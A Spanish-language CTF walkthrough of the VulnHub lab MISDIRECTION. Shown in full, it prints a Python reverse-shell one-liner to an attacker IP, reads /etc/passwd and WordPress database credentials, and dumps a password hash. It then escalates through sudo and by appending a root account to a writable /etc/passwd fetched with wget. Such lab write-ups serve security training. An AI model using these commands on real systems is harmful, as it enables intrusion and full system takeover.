# MISDIRECTION
Desarrollo del CTF MISDIRECTION


## 1. Configuración de VM

- Descarga de la VM: https://www.vulnhub.com/entry/misdirection-1,371/
- La VM funciona OK en VmWare Workstation.

## 2. Escaneo de Puertos

```
Nmap 7.91 scan initiated Tue Apr 13 22:19:48 2021 as: nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.157
Nmap scan report for 10.10.10.157
Host is up (0.00036s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:6F:F9:A3 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<img src="https://github.com/El-Palomo/MISDIRECTION/blob/main/misdirection1.jpg" width=80% />


## 3. Enumeración

### 3.1. Enumeración HTTP - TCP/80

- Ejecutamos GOBUSTER

```
/admin (Status: 200) [Size: 42]
/examples (Status: 200) [Size: 6937]
/init (Status: 200) [Size: 5782]
/server-status (Status: 403) [Size: 300]
```

- tomamos nota de WEB2PY 

<img src="https://github.com/El-Palomo/MISDIRECTION/blob/main/misdirection2.jpg" width=80% />


### 3.2. Enumeración HTTP - TCP/8080

```
gobuster -u http://10.10.10.157:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s "200,204,301,302,307,401,403" -x "txt,html,php,asp,aspx,jsp"

/.htaccess (Status: 403) [Size: 298]
/.htaccess.jsp (Status: 403) [Size: 302]
/.htaccess.txt (Status: 403) [Size: 302]
/.htaccess.html (Status: 403) [Size: 303]
/.htaccess.php (Status: 403) [Size: 302]
/.htaccess.asp (Status: 403) [Size: 302]
/.htaccess.aspx (Status: 403) [Size: 303]
/.htpasswd (Status: 403) [Size: 298]
/.htpasswd.asp (Status: 403) [Size: 302]
/.htpasswd.aspx (Status: 403) [Size: 303]
/.htpasswd.jsp (Status: 403) [Size: 302]
/.htpasswd.txt (Status: 403) [Size: 302]
/.htpasswd.html (Status: 403) [Size: 303]
/.htpasswd.php (Status: 403) [Size: 302]
/.hta (Status: 403) [Size: 293]
/.hta.txt (Status: 403) [Size: 297]
/.hta.html (Status: 403) [Size: 298]
/.hta.php (Status: 403) [Size: 297]
/.hta.asp (Status: 403) [Size: 297]
/.hta.aspx (Status: 403) [Size: 298]
/.hta.jsp (Status: 403) [Size: 297]
/css (Status: 301) [Size: 317]
/debug (Status: 301) [Size: 319]
/development (Status: 301) [Size: 325]
/help (Status: 301) [Size: 318]
/images (Status: 301) [Size: 320]
/index.html (Status: 200) [Size: 10918]
/index.html (Status: 200) [Size: 10918]
/js (Status: 301) [Size: 316]
/manual (Status: 301) [Size: 320]
/scripts (Status: 301) [Size: 321]
/server-status (Status: 403) [Size: 302]
/shell (Status: 301) [Size: 319]
/wordpress (Status: 301) [Size: 323]
```

- De los archivos identificados la carpeta /DEBUG es obviamente algo que llama la atención porque parece ser una WEBSHELL.

<img src="https://github.com/El-Palomo/MISDIRECTION/blob/main/misdirection3.jpg" width=80% />


## 4. Obtención de webshell

### 4.1. Ejecución de comando a través de DEBUG

- Tenemos una consola de ejecutación de comandos asi que vamos a obtener una shell reversa.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.131",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<img src="https://github.com/El-Palomo/MISDIRECTION/blob/main/misdirection4.jpg" width=80% />

### 4.2. Enumeración de información

- Usuarios del sistema operativo

```
www-data@misdirection:/var/www/html/debug$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
brexit:x:1000:1000:brexit:/home/brexit:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
```

- Credenciales en el servidor web 

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wp_myblog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', 'abcdefghijklmnopqrstuv' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

<img src="https://github.com/El-Palomo/MISDIRECTION/blob/main/misdirection5.jpg" width=80% />

- Información en la BD MySQL

```
Database changed
mysql> show tables;
show tables;
+-----------------------+
| Tables_in_wp_myblog   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email       | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BC4vcMsqXqr/cc46cx.E1arnrBq1yU/ | admin         | admin@brexit.com |          | 2019-06-01 06:08:19 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
```

- De inmediato inicie el CRACKING del password. Sin exito.


## 5. Elevación de privilegios - 1era Parte

- La enumeración no arrojó nada importante, sin embargo el usuario www-data puede ejecutar un comando a través de SUDO.

```
www-data@misdirection:/var/www/html/wordpress$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@misdirection:/var/www/html/wordpress$ sudo -l
sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
```

<img src="https://github.com/El-Palomo/MISDIRECTION/blob/main/misdirection6.jpg" width=80% />

> Bingo ya somos el usuario BREXIT.


## 6. Elevación de privilegios - ROOT

- Esta vez está sencillo elevar privilegios. El archivo PASSWD puede ser editado por el usuario BREXIT.

```
brexit@misdirection:/var/www/html/wordpress$ ls -la /etc/passwd
ls -la /etc/passwd
-rwxrwxr-- 1 root brexit 1859 Apr 14 03:27 /etc/passwd
```

- Creamos la contraseña y lo guardamos en un archivo en KALI LINUX.

```
root@kali:/var/www/html# mkpasswd  -m sha-512 -S saltsalt -s
Password: 12345678
$6$saltsalt$9vIXh5xFJESF2.DxxXyWlpOT.0t06Y2Pk11StIw2L8oaOTl42ZfuhPPi5h2PPjbLI.FnnhTBEMMcL05LS2ZmY.
root@kali:/var/www/html# cat add-passwd.txt 
palomo:$6$saltsalt$9vIXh5xFJESF2.DxxXyWlpOT.0t06Y2Pk11StIw2L8oaOTl42ZfuhPPi5h2PPjbLI.FnnhTBEMMcL05LS2ZmY.:0:0::/root/:/bin/bash
```

<img src="https://github.com/El-Palomo/MISDIRECTION/blob/main/misdirection7.jpg" width=80% />

- En la VM MISDIRECTION descargamos el archivo y lo añadimos al archivo passwd.

```
brexit@misdirection:/tmp$ wget http://10.10.10.131/add-passwd.txt
wget http://10.10.10.131/add-passwd.txt
--2021-04-16 23:43:55--  http://10.10.10.131/add-passwd.txt
Connecting to 10.10.10.131:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 128 [text/plain]
Saving to: 'add-passwd.txt.1'

add-passwd.txt.1    100%[===================>]     128  --.-KB/s    in 0s      

2021-04-16 23:43:55 (27.8 MB/s) - 'add-passwd.txt.1' saved [128/128]

brexit@misdirection:/tmp$ cat add-passwd.txt >> /etc/passwd
```

<img src="https://github.com/El-Palomo/MISDIRECTION/blob/main/misdirection8.jpg" width=80% />

```
brexit@misdirection:/tmp$ su palomo                        
su palomo
Password: 12345678

root@misdirection:/tmp# cd /root
cd /root
root@misdirection:/root# ls
ls
root.txt
root@misdirection:/root# cat root.txt
cat root.txt
0d2c6222bfdd3701e0fa12a9a9dc9c8c
root@misdirection:/root# 
```

<img src="https://github.com/El-Palomo/MISDIRECTION/blob/main/misdirection9.jpg" width=80% />


